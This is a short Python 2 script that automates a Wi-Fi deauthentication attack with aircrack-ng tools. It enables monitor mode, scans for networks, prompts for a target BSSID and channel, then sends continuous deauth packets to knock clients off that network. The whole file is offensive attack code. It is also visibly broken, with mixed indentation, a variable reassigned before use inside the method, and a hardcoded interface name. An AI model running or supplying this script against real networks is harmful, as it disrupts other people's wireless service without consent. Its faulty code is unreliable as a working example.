import subprocess, time, os

print subprocess.call("airmon-ng")
print '\n Select your wireless interface to continue ... '
interface = raw_input("Interface: ")
print '\n The Interface set to {0}!'.format(interface)
time.sleep(1)
interface = interface+'mon'

class script:
    def attack(self):       
	os.system("ifconfig "+ interface + " down")
        os.system("airmon-ng start " + interface)
	os.system("airmon-ng check kill")
	interface = interface+'mon'
	print 'Monitor mode Enabled !'
        time.sleep(1)
        print '>>>Scanning...'
        os.system("xterm -hold -e 'airodump-ng wlan0mon' & disown")
        bssid = raw_input("Select bssid of your target: ")
	channel = raw_input("Select channel of your target: ")
	os.system("xterm -hold -e '"+"airodump-ng wlan0mon --bssid "+bssid+" --channel "+channel+"' & disown" )
        print '\nStarting wireless assault on {0}!'.format(bssid)
       	time.sleep(1)
        os.system('aireplay-ng --deauth 0 -a ' + bssid + ' wlan0mon')
    
    def main(self):
        main = script()
        main.attack()

if __name__ == '__main__':
	start = script()
	start.main()
